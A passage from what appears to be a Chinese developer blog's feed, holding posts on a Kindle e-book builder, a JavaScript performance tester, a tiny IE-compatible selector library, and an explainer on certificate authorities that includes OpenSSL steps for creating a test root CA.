工具构建，我已经把这个文件放到了 <a href="//github.com/barretlee/kindleBookMaker/blob/master/bin/kindlegen">&#x2F;bin&#x2F;kindlegen</a> 下，大约 28M，有点大。</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>可以下载代码之后，尝试运行下已经提供了一个 DEMO（封面图片就懒得换了，是我自己的头像）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> //github.com/barretlee/kindleBookMaker.git;</span><br><span class="line"><span class="built_in">cd</span> kindleBookMaker;</span><br><span class="line">npm install;</span><br><span class="line">node index;</span><br><span class="line">open build/*.mobi;</span><br></pre></td></tr></table></figure><p>提供了很多方法可以调用，不过都通过命令行的方式简化了：</p><ul><li>从 RSS 源构建：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">node index --rss http://barretlee.com/rss2.xml</span><br><span class="line"><span class="comment"># node index -r http://barretlee.com/rss2.xml</span></span><br></pre></td></tr></table></figure></li><li>从单个 URI 构建，<code>-u URL titleQuery ContentQuery FilterRegExp</code>， 其中 titleQuery 为文章标题的 css query，ContentQuery 为文章主要内容的 css query，FilterRegExp 为正则过滤：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">node index --uri \</span><br><span class="line">    https://www.barretlee.com/blog/2016/04/28/mini-query/ \</span><br><span class="line">    .post-title \</span><br><span class="line">    .post-content \</span><br><span class="line">    /&lt;div class=<span class="string">&quot;shit-spider&quot;</span>[\s\S]+?&lt;\/div&gt;/</span><br></pre></td></tr></table></figure></li><li>从本地构建<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">node index --dirctory ./src/demo/</span><br><span class="line"><span class="comment"># node index -d ./src/demo/</span></span><br></pre></td></tr></table></figure></li></ul><p>还有另外三个参数：</p><ul><li><code>--verbose</code>, <code>-v</code>, 查看 kindle 构建的详细细节，因为编译也可能出错</li><li><code>--help</code>, <code>-h</code>, 帮助说明</li><li><code>-push2kindle</code>, <code>-p</code>, 将构建的 <code>.mobi</code> 文件推送你设定的 kindle 账户上</li></ul><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> moment = <span class="built_in">require</span>(<span class="string">&#x27;moment&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// entry: &#x27;./src/KF8-Demo&#x27;,</span></span><br><span class="line">  <span class="attr">entry</span>: &#123;</span><br><span class="line">    <span class="attr">base</span>: <span class="string">&#x27;./src/KF8-Demo&#x27;</span>,</span><br><span class="line">    <span class="attr">list</span>: []</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">bookInfo</span>: &#123;</span><br><span class="line">    <span class="attr">title</span>: <span class="string">&quot;Barret Lee&#x27;s Personal Website&quot;</span>,</span><br><span class="line">    <span class="attr">lang</span>: <span class="string">&quot;zh&quot;</span>,</span><br><span class="line">    <span class="attr">creator</span>: <span class="string">&quot;Barret Lee&quot;</span>,</span><br><span class="line">    <span class="attr">copyright</span>: <span class="string">&quot;Barret Lee&quot;</span>,</span><br><span class="line">    <span class="attr">publisher</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">coverImage</span>: <span class="string">&#x27;coverImage.png&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/*option*/</span></span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">base</span>: <span class="string">&#x27;./build&#x27;</span>,</span><br><span class="line">    <span class="attr">format</span>: <span class="string">&#x27;[name]-&#x27;</span> + <span class="title function_">moment</span>().<span class="title function_">format</span>(<span class="string">&#x27;YYYYMMDD&#x27;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/*option for uri*/</span></span><br><span class="line">  <span class="attr">singlePage</span>: &#123;</span><br><span class="line">    <span class="attr">title</span>: <span class="string">&#x27;div.title&#x27;</span>,</span><br><span class="line">    <span class="attr">description</span>: <span class="string">&#x27;div.content&#x27;</span>,</span><br><span class="line">    <span class="attr">reg</span>: <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> data.<span class="title function_">replace</span>(<span class="regexp">/&lt;div class=&quot;shit-spider&quot;[\s\S]+?&lt;\/div&gt;/</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/*option*/</span></span><br><span class="line">  <span class="attr">push2kindle</span>: &#123;</span><br><span class="line">    <span class="attr">email</span>: <span class="string">&#x27;barret.china@gmail.com&#x27;</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&#x27;your-email-password&#x27;</span>,</span><br><span class="line">    <span class="attr">kindle</span>: <span class="string">&#x27;barretlee.com@kindle.cn&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><code>entry</code>, 可以为一个 String 或者 Object<ul><li><code>base</code>, 入口地址，下载的文件都会放在这里</li><li><code>list</code>, list 参数，会影响最后生成的电子书的文章排序</li></ul></li><li><code>bookInfo</code>, 注意设置 <code>coverImage</code>，它为书籍封面图片</li><li><code>ouput</code>, 可选参数, 默认值为 <code>./build</code> 和 <code>[name]</code></li><li><code>singlePage</code>, 可选参数, 从 URI 爬取数据时会用到</li><li><code>push2kindle</code>, 可选参数, <code>kindle</code> 参数为你设备对应的推送邮箱, 可以在 <a href="//www.amazon.cn/mn/dcw/myx.html/ref=kinw_myk_redirect#/home/settings/payment">这里</a> 设置</li></ul><h3 id="Todo"><a href="#Todo" class="headerlink" title="Todo"></a>Todo</h3><ul><li>直接从 Markdown 文件生成内容</li><li>找到 kindle 帐号偶尔不接受我推送 <code>.mobi</code> 文件的原因，意思就是有的时候推送未成功</li></ul><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ul><li><a href="http://www.idpf.org/epub/30/spec/epub30-publications.html#sec-item-property-values">http://www.idpf.org/epub/30/spec/epub30-publications.html#sec-item-property-values</a></li><li><a href="http://www.idpf.org/epub/20/spec/OPF_2.0.1_draft.htm">http://www.idpf.org/epub/20/spec/OPF_2.0.1_draft.htm</a></li><li><a href="http://www.aliciaramirez.com/2014/05/how-to-make-a-kindle-ebook-from-scratch/">http://www.aliciaramirez.com/2014/05/how-to-make-a-kindle-ebook-from-scratch/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kindle </tag>
            
            <tag> kindleGen </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 代码执行效率对比工具</title>
      <link href="/blog/2016/04/28/javascript-performance-tester/"/>
      <url>/blog/2016/04/28/javascript-performance-tester/</url>
      
        <content type="html"><![CDATA[<p>平时写些小页面小程序，一般不会出现性能问题，但是在大的工程，或者在写一个框架、类库的时候，代码的性能就需要提高一个优先级了。测试代码的性能有多种方案：</p><ul><li>在 <a href="http://jsperf.com/">http://jsperf.com</a> 上测试</li><li>使用 <code>console.time</code> 来收集代码执行的时间<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">time</span>(<span class="string">&#x27;Name&#x27;</span>);</span><br><span class="line"><span class="comment">// code here...</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">timeEnd</span>(<span class="string">&#x27;Name&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li>自己写一个时间控制器</li></ul><span id="more"></span><p>本文自然就是自己撸一个简单易用的测试工具，效果如下图：</p><p><img src="/../blogimgs/2016/04/28/TB1d238JpXXXXcoXFXXXXXXXXXX-446-570.gif" alt="JavaScript 代码执行效率对比工具"><!--<source src="https://img.alicdn.com/tps/TB1d238JpXXXXcoXFXXXXXXXXXX-446-570.gif">--></p><h3 id="设计分析"><a href="#设计分析" class="headerlink" title="设计分析"></a>设计分析</h3><p>可以先把代码下载下来，跑起来：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> //github.com/barretlee/performance.git</span><br><span class="line"><span class="built_in">cd</span> performance/test;</span><br><span class="line">open index.html;</span><br></pre></td></tr></table></figure><p>或者直接打开测试页面：<a href="http://barretlee.github.io/performance/test/">http://barretlee.github.io/performance/test/</a>。</p><p>点击代码按钮，Performance 会循环执行 button 中的代码，持续时间是设定的 1000ms，每次执行完，都会计算出相对效率，100% 是效率最高的，剩下的自然就是效率比较低的，从而可以比较清晰地看出程序之间性能差异。</p><h3 id="相关阅读"><a href="#相关阅读" class="headerlink" title="相关阅读"></a>相关阅读</h3><ul><li><a href="http://share.web-tinker.com/performance.js">http://share.web-tinker.com/performance.js</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> 前端杂烩 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> Performance </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>元素选择器 - Mini Query</title>
      <link href="/blog/2016/04/28/mini-query/"/>
      <url>/blog/2016/04/28/mini-query/</url>
      
        <content type="html"><![CDATA[<p>寥寥几行代码，实现一个简单的元素选择器，兼容低版本 IE。</p><span id="more"></span><p>自 IE8 开始已经开始支持 querySelector 和 querySelectorAll 这两个十分有用的选择器函数，如果不考虑低版本浏览器，它们已经可以基本满足日常需求了。而在兼容低版本浏览器中，可以采用一些 hack 手段。</p><p>原理比较简单：通过 CSS Rule 给我们的目标元素添加特殊属性，然后遍历所有元素找到具备特殊属性的元素，当然，找到之后，移除这些特殊属性。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> firstStyleSheet = <span class="variable language_">document</span>.<span class="property">styleSheets</span>[<span class="number">0</span>] || <span class="variable language_">document</span>.<span class="title function_">createStyleSheet</span>();</span><br><span class="line">  firstStyleSheet.<span class="title function_">addRule</span>(query, <span class="string">&#x27;Barret:Lee&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = <span class="variable language_">document</span>.<span class="property">all</span>.<span class="property">length</span>; i &lt; len; i++) &#123;</span><br><span class="line">  <span class="keyword">var</span> item = <span class="variable language_">document</span>.<span class="property">all</span>[i];</span><br><span class="line">  item.<span class="property">currentStyle</span>.<span class="property">Barret</span> &amp;&amp; res.<span class="title function_">push</span>(item);</span><br><span class="line">&#125;</span><br><span class="line">firstStyleSheet.<span class="title function_">removeRule</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>比如我们要获取 <code>.box .item a.pink</code> 元素，上面的代码是这么做的,</p><ul><li>给所有的 <code>.box .item a.pink</code> 元素添加 <code>&#123; Barret: Lee; &#125;</code> 这个 CSS 的样式</li><li>遍历所有元素找到包含 Barret 这个 CSS 属性的元素</li><li>移除属性</li></ul><p>IE8 有些调皮，需要修复点小问题，源码地址：</p><ul><li>git clone <a href="http://github.com/barretlee/MiniQuery">http://github.com/barretlee/MiniQuery</a></li><li><code>npm install mini-query</code></li></ul><p>代码预览：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">$</span>(<span class="params">query</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> res = [];</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">querySelectorAll</span>) &#123;</span><br><span class="line">    res = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(query);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> firstStyleSheet = <span class="variable language_">document</span>.<span class="property">styleSheets</span>[<span class="number">0</span>] || <span class="variable language_">document</span>.<span class="title function_">createStyleSheet</span>();</span><br><span class="line">    query = query.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, len = query.<span class="property">length</span>; i &lt; len; i++) &#123;</span><br><span class="line">      firstStyleSheet.<span class="title function_">addRule</span>(query[i], <span class="string">&#x27;Barret:Lee&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = <span class="variable language_">document</span>.<span class="property">all</span>.<span class="property">length</span>; i &lt; len; i++) &#123;</span><br><span class="line">      <span class="keyword">var</span> item = <span class="variable language_">document</span>.<span class="property">all</span>[i];</span><br><span class="line">      item.<span class="property">currentStyle</span>.<span class="property">Barret</span> &amp;&amp; res.<span class="title function_">push</span>(item);</span><br><span class="line">    &#125;</span><br><span class="line">    firstStyleSheet.<span class="title function_">removeRule</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(res.<span class="property">item</span>) &#123; <span class="comment">/* Fuck IE8 */</span></span><br><span class="line">    <span class="keyword">var</span> ret = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, len = res.<span class="property">length</span>; i &lt; len; i++)&#123;</span><br><span class="line">      ret.<span class="title function_">push</span>(res.<span class="title function_">item</span>(i));</span><br><span class="line">    &#125;</span><br><span class="line">    res = ret;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> 前端杂烩 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mini Query </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>细说 CA 和证书</title>
      <link href="/blog/2016/04/24/detail-about-ca-and-certs/"/>
      <url>/blog/2016/04/24/detail-about-ca-and-certs/</url>
      
        <content type="html"><![CDATA[<p>CA，Catificate Authority，它的作用就是提供证书（即服务器证书，由域名、公司信息、序列号和签名信息组成）加强服务端和客户端之间信息交互的安全性，以及证书运维相关服务。任何个体&#x2F;组织都可以扮演 CA 的角色，只不过难以得到客户端的信任，能够受浏览器默认信任的 CA 大厂商有很多，其中 TOP5 是 Symantec、Comodo、Godaddy、GolbalSign 和 Digicert。</p><span id="more"></span><h3 id="服务器证书分类"><a href="#服务器证书分类" class="headerlink" title="服务器证书分类"></a>服务器证书分类</h3><p>可以通过两个维度来分类，一个是商业角度，一个是业务角度。</p><style>.cert-eg th,.cert-eg td {text-align:center;}.cert-eg .align-left{text-align:left;}.cert-eg br{display: block;}</style><table class='cert-eg'>  <tr>    <th></th>    <th>单域名</th>    <th>多域名</th>    <th>泛域名</th>    <th>多泛域名</th>  </tr>  <tr>    <th>DV</th>    <td colspan="2">支持</td>    <td colspan="2">不支持</td>  </tr>  <tr>    <th>OV</th>    <td colspan="4">支持</td>  </tr>  <tr>    <th>EV</th>    <td colspan="2">支持</td>    <td colspan="2">不支持</td>  </tr>  <tr>    <th>举例</th>    <td>www.barretlee.com</td>    <td class="align-left">www.barretlee.com<br>www.xiaohuzige.com<br>www.barret.cc</td>    <td>*.barretlee.com</td>    <td class="align-left">*.barretlee.com<br>*.xiaohuzige.com<br>*.barret.cc</td>  </tr></table><p><strong>需要强调的是，不论是 DV、OV 还是 EV 证书，其加密效果都是一样的！</strong> 它们的区别在于：</p><ul><li>DV（Domain Validation），面向个体用户，安全体系相对较弱，验证方式就是向 whois 信息中的邮箱发送邮件，按照邮件内容进行验证即可通过；</li><li>OV（Organization Validation），面向企业用户，证书在 DV 证书验证的基础上，还需要公司的授权，CA 通过拨打信息库中公司的电话来确认；</li><li>EV（Extended Validation），打开 Github 的网页，你会看到 URL 地址栏展示了注册公司的信息，这会让用户产生更大的信任，这类证书的申请除了以上两个确认外，还需要公司提供金融机构的开户许可证，要求十分严格。</li></ul><p>OV 和 EV 证书相当昂贵，使用方可以为这些颁发出来的证书买保险，一旦 CA 提供的证书出现问题，一张证书的赔偿金可以达到 100w 刀以上。</p><h3 id="CA-的作用"><a href="#CA-的作用" class="headerlink" title="CA 的作用"></a>CA 的作用</h3><p>前文 <a href="https://www.barretlee.com/blog/2015/10/05/how-to-build-a-https-server/">HTTPS证书生成原理和部署细节</a> 提到如果本地生成公&#x2F;私钥对和对应未签证的证书，如果使用的证书没有签证，或者未在浏览器受信的 CA 签证，你会看到下图的问题：</p><p><img src="/../blogimgs/2016/04/24/6c0378f8gw1f36o0231kaj20fh0dd0ti.jpg" alt="net:ERR_CERT_AUTHORITY_INVALID"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f36o0231kaj20fh0dd0ti.jpg">--></p><p>上图出现的错误是 <code>net:ERR_CERT_AUTHORITY_INVALID</code>，我们生成证书和公&#x2F;私钥对的流程都是正确的，但是浏览器不认这张证书，并且提示证书授权不通过；如果通过其他与 Common Name 不同的域名去访问，如我注册的时候使用的 <code>localhost</code>，但是访问的时候用的 <code>127.0.0.1</code>，还会报出这样的错误：</p><p><img src="/../blogimgs/2016/04/24/6c0378f8gw1f36o3s81yfj20lk0dw75v.jpg" alt="net:ERR_CERT_COMMON_NAME_INVALID"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f36o3s81yfj20lk0dw75v.jpg">--></p><p>错误码为 <code>net:ERR_CERT_COMMON_NAME_INVALID</code>，意思是 Common Name 不匹配，具体校验流程可以在浏览器的 DevTools 中看到：</p><p><img src="/../blogimgs/2016/04/24/6c0378f8gw1f36o5lmwxdj20og0cmdhb.jpg" alt="DevTools"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f36o5lmwxdj20og0cmdhb.jpg">--></p><p>从上面几张图，可以大致了解 CA 和证书会做哪些事情，证书由域名、公司信息、序列号和签名信息组成，当我们通过 HTTPS 访问页面时，浏览器会主动验证证书信息是否匹配，也会验证证书是否有效。</p><p>CA 有权给所有的域名签发证书，如它可以私自给我的网站签发一张 <code>www.barretlee.com</code> 的证书，并且可以拿着新证书拦截网页流量（当然，前提是这个 CA 是浏览器认证的权威 CA），那我的网站可能就很不安全了，对拥新证书的人来说，我的网站等同于在 HTTP 下进行通讯。</p><h3 id="评估-CA-供应商"><a href="#评估-CA-供应商" class="headerlink" title="评估 CA 供应商"></a>评估 CA 供应商</h3><p>CA 供应商很多，提供服务的侧重点可能也存在一些差异，比如很多 CA 都没有提供证书吊销的服务，这一点对于安全性要求很高的企业来说是完全不能接受的，那么对 CA 供应商的评估需要注意写什么呢？</p><p><strong>1. 内置根</strong></p><p>所谓内置根，就是 CA 的根证书内置到各种通用的系统&#x2F;浏览器中，只有根证书的兼容性够强，它所能覆盖的浏览器才会越多。</p><p><strong>2. 安全体系</strong></p><p>两个指标可以判断 CA 供应商是否靠谱，一是看价格，价格高自然有它的理由，必然提供了全套的安全保障体系；二是看黑历史，该 CA 供应商有没有爆出过什么漏洞，比如之前的 DigiNotar，被伊朗入侵，签发了 500 多张未授权的证书，结果直接被各系统&#x2F;浏览器将其根拉入黑名单，毫无疑问公司直接倒闭。</p><p><strong>3. 核心功能和扩展功能</strong></p><p>这就需要从业务上考虑了，不同的规模的企业、不同的业务对证书的要求不一样，比如证书是否会考虑无 SNI 支持的浏览器问题，是否支持在 reissue 的时候添加域名，是否支持 CAA，是否支持短周期证书等等。</p><p><strong>4. 价格</strong></p><p>企业完全没必要购买 Github 那样的 EV 证书，太昂贵，而且一般的企业也未必能够申请到这样的证书。供应商很大，价格可以好好评估下，不一定要最贵，最适合的就行。</p><h3 id="自建-Root-CA"><a href="#自建-Root-CA" class="headerlink" title="自建 Root CA"></a>自建 Root CA</h3><p>OpenSSL 是一个免费开源的库，它提供了构建数字证书的命令行工具，其中一些可以用来自建 Root CA。</p><p>很多网站都希望用户知道他们建立的网络通道是安全的，所以会想 CA 机构购买证书来验证 domain，所以我们也可以在很多 HTTPS 的网页地址栏看到一把小绿锁。</p><p>然而在一些情况下，我们没必要去 CA 机构购买证书，比如在内网的测试环境中，为了验证 HTTPS 下的一些问题，我们不需要部署昂贵的证书，这个时候自建 Root CA，给自己颁发证书就显得很有价值了。</p><p>本节内容较多，主要是代码演示生成证书和验证的过程，可以跳过看下一节，直接看 <a href="//github.com/barretlee/autocreate-ca/README.md">这里</a>：</p><ul><li><code>git clone //github.com/barretlee/autocreate-ca.git</code></li><li>依次执行 <code>install-rootCA.sh</code>、<code>install-intermediateCA.sh</code> 和 <code>install-websiteConfig.sh</code></li></ul><p>首先找到一个放置证书的文件夹，比如 <code>/root/ca</code> 下，下方的测试也在改目录下，如果你要更换其他目录，记得替换下文中的目录地址。</p><h4 id="创建-root-pair"><a href="#创建-root-pair" class="headerlink" title="创建 root pair"></a>创建 root pair</h4><p>扮演 CA 角色，就意味着要管理大量的 pair 对，而原始的一对 pair 对叫做 root pair，它包含了 root key（<code>ca.key.pen</code>）和 root certificate（<code>ca.cert.pem</code>）。通常情况下，root CA 不会直接为服务器或者客户端签证，它们会先为自己生成几个中间 CA（intermediate CAs），这几个中间 CA 作为 root CA 的代表为服务器和客户端签证。</p><p><strong>注意：一定要在绝对安全的环境下创建 root pair，可以断开网络、拔掉网线和网卡，当然，如果是测试玩一玩就不用这么认真了。</strong></p><p>设定文件夹结构，并且配置好 openssl 设置：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /root/ca</span><br><span class="line">$ <span class="built_in">mkdir</span> certs crl newcerts private</span><br><span class="line">$ <span class="built_in">chmod</span> 700 private</span><br><span class="line">$ <span class="built_in">touch</span> index.txt</span><br><span class="line">$ <span class="built_in">echo</span> 1000 &gt; serial</span><br><span class="line">$ wget -O /root/ca/openssl.cnf \ </span><br><span class="line">    //raw.githubusercontent.com/barretlee/autocreate-ca/master/cnf/root-ca</span><br></pre></td></tr></table></figure><p>创建 root key，密码可为空，设定权限为只可读：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /root/ca</span><br><span class="line">$ openssl genrsa -aes256 -out private/ca.key.pem 4096</span><br><span class="line"></span><br><span class="line">Enter pass phrase <span class="keyword">for</span> ca.key.pem: secretpassword</span><br><span class="line">Verifying - Enter pass phrase <span class="keyword">for</span> ca.key.pem: secretpassword</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">chmod</span> 400 private/ca.key.pem</span><br></pre></td></tr></table></figure><p>创建 root cert，权限设置为可读：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /root/ca</span><br><span class="line">$ openssl req -config openssl.cnf \</span><br><span class="line">      -key private/ca.key.pem \</span><br><span class="line">      -new -x509 -days 7300 -sha256 -extensions v3_ca \</span><br><span class="line">      -out certs/ca.cert.pem</span><br><span class="line"></span><br><span class="line">Enter pass phrase <span class="keyword">for</span> ca.key.pem: secretpassword</span><br><span class="line">You are about to be asked to enter information that will be incorporated</span><br><span class="line">into your certificate request.</span><br><span class="line">-----</span><br><span class="line">Country Name (2 letter code) [XX]:CN</span><br><span class="line">State or Province Name []:Zhejiang</span><br><span class="line">Locality Name []:</span><br><span class="line">Organization Name []:Barret Lee</span><br><span class="line">Organizational Unit Name []:Barret Lee Certificate Authority</span><br><span class="line">Common Name []:Barret Lee Root CA</span><br><span class="line">Email Address []:</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">chmod</span> 444 certs/ca.cert.pem</span><br></pre></td></tr></table></figure><p>验证证书：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ openssl x509 -noout -text -<span class="keyword">in</span> certs/ca.cert.pem</span><br></pre></td></tr></table></figure><p>正确的输出应该是这样的：</p><figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="variable">Certificate</span><span class="operator">:</span></span><br><span class="line">    <span class="variable">Data</span><span class="operator">:</span></span><br><span class="line">        <span class="variable">Version</span><span class="operator">:</span> <span class="number">3</span> <span class="punctuation">(</span><span class="number">0</span><span class="variable">x2</span><span class="punctuation">)</span></span><br><span class="line">        <span class="variable">Serial</span> <span class="built_in">Number</span><span class="operator">:</span></span><br><span class="line">            <span class="number">87</span><span class="operator">:</span><span class="variable">e8</span><span class="operator">:</span><span class="variable">c0</span><span class="operator">:</span><span class="variable">a0</span><span class="operator">:</span><span class="number">4</span><span class="variable">b</span><span class="operator">:</span><span class="variable">e2</span><span class="operator">:</span><span class="number">12</span><span class="operator">:</span><span class="number">5</span><span class="variable">d</span></span><br><span class="line">        <span class="built_in">Signature</span> <span class="variable">Algorithm</span><span class="operator">:</span> <span class="variable">sha256WithRSAEncryption</span></span><br><span class="line">        <span class="variable">Issuer</span><span class="operator">:</span> <span class="built_in">C</span><span class="operator">=</span><span class="variable">CN</span><span class="operator">,</span> <span class="variable">ST</span><span class="operator">=</span><span class="variable">Zhejiang</span><span class="operator">,</span> <span class="built_in">O</span><span class="operator">=</span><span class="variable">Barret</span> <span class="variable">Lee</span><span class="operator">,</span> <span class="variable">OU</span><span class="operator">=</span><span class="variable">Barret</span> <span class="variable">Lee</span> <span class="variable">Certificate</span> <span class="variable">Authority</span><span class="operator">,</span> <span class="variable">CN</span><span class="operator">=</span><span class="variable">Barret</span> <span class="variable">Lee</span> <span class="built_in">Root</span> <span class="variable">CA</span></span><br><span class="line">        <span class="variable">Validity</span></span><br><span class="line">            <span class="built_in">Not</span> <span class="built_in">Before</span><span class="operator">:</span> <span class="variable">Apr</span> <span class="number">23</span> <span class="number">05</span><span class="operator">:</span><span class="number">46</span><span class="operator">:</span><span class="number">36</span> <span class="number">2016</span> <span class="variable">GMT</span></span><br><span class="line">            <span class="built_in">Not</span> <span class="built_in">After</span> <span class="operator">:</span> <span class="variable">Apr</span> <span class="number">18</span> <span class="number">05</span><span class="operator">:</span><span class="number">46</span><span class="operator">:</span><span class="number">36</span> <span class="number">2036</span> <span class="variable">GMT</span></span><br><span class="line">        <span class="variable">Subject</span><span class="operator">:</span> <span class="built_in">C</span><span class="operator">=</span><span class="variable">CN</span><span class="operator">,</span> <span class="variable">ST</span><span class="operator">=</span><span class="variable">Zhejiang</span><span class="operator">,</span> <span class="built_in">O</span><span class="operator">=</span><span class="variable">Barret</span> <span class="variable">Lee</span><span class="operator">,</span> <span class="variable">OU</span><span class="operator">=</span><span class="variable">Barret</span> <span class="variable">Lee</span> <span class="variable">Certificate</span> <span class="variable">Authority</span><span class="operator">,</span> <span class="variable">CN</span><span class="operator">=</span><span class="variable">Barret</span> <span class="variable">Lee</span> <span class="built_in">Root</span> <span class="variable">CA</span></span><br><span class="line">        <span class="variable">Subject</span> <span class="variable">Public</span> <span class="built_in">Key</span> <span class="variable">Info</span><span class="operator">:</span></span><br><span class="line">            <span class="variable">Public</span> <span class="built_in">Key</span> <span class="variable">Algorithm</span><span class="operator">:</span> <span class="variable">rsaEncryption</span></span><br><span class="line">            <span class="variable">RSA</span> <span class="variable">Public</span> <span class="built_in">Key</span><span class="operator">:</span> <span class="punctuation">(</span><span class="number">4096</span> <span class="variable">bit</span><span class="punctuation">)</span></span><br><span class="line">                <span class="built_in">Modulus</span> <span class="punctuation">(</span><span class="number">4096</span> <span class="variable">bit</span><span class="punctuation">)</span><span class="operator">:</span></span><br><span class="line">                    <span class="operator">//</span> <span class="operator">...</span></span><br><span class="line">                <span class="built_in">Exponent</span><span class="operator">:</span> <span class="number">65537</span> <span class="punctuation">(</span><span class="number">0</span><span class="variable">x10001</span><span class="punctuation">)</span></span><br><span class="line">        <span class="variable">X509v3</span> <span class="variable">extensions</span><span class="operator">:</span></span><br><span class="line">            <span class="variable">X509v3</span> <span class="variable">Subject</span> <span class="built_in">Key</span> <span class="variable">Identifier</span><span class="operator">:</span></span><br><span class="line">                <span class="variable">E5</span><span class="operator">:</span><span class="number">2</span><span class="built_in">D</span><span class="operator">:</span><span class="variable">B8</span><span class="operator">:</span><span class="number">2</span><span class="variable">B</span><span class="operator">:</span><span class="variable">DC</span><span class="operator">:</span><span class="number">88</span><span class="operator">:</span><span class="variable">FE</span><span class="operator">:</span><span class="variable">CE</span><span class="operator">:</span><span class="variable">DA</span><span class="operator">:</span><span class="number">93</span><span class="operator">:</span><span class="variable">D8</span><span class="operator">:</span><span class="number">6</span><span class="variable">F</span><span class="operator">:</span><span class="number">2</span><span class="built_in">E</span><span class="operator">:</span><span class="number">74</span><span class="operator">:</span><span class="number">04</span><span class="operator">:</span><span class="variable">D2</span><span class="operator">:</span><span class="number">39</span><span class="operator">:</span><span class="variable">E7</span><span class="operator">:</span><span class="variable">C8</span><span class="operator">:</span><span class="number">03</span></span><br><span class="line">            <span class="variable">X509v3</span> <span class="variable">Authority</span> <span class="built_in">Key</span> <span class="variable">Identifier</span><span class="operator">:</span></span><br><span class="line">                <span class="variable">keyid</span><span class="operator">:</span><span class="variable">E5</span><span class="operator">:</span><span class="number">2</span><span class="built_in">D</span><span class="operator">:</span><span class="variable">B8</span><span class="operator">:</span><span class="number">2</span><span class="variable">B</span><span class="operator">:</span><span class="variable">DC</span><span class="operator">:</span><span class="number">88</span><span class="operator">:</span><span class="variable">FE</span><span class="operator">:</span><span class="variable">CE</span><span class="operator">:</span><span class="variable">DA</span><span class="operator">:</span><span class="number">93</span><span class="operator">:</span><span class="variable">D8</span><span class="operator">:</span><span class="number">6</span><span class="variable">F</span><span class="operator">:</span><span class="number">2</span><span class="built_in">E</span><span class="operator">:</span><span class="number">74</span><span class="operator">:</span><span class="number">04</span><span class="operator">:</span><span class="variable">D2</span><span class="operator">:</span><span class="number">39</span><span class="operator">:</span><span class="variable">E7</span><span class="operator">:</span><span class="variable">C8</span><span class="operator">:</span><span 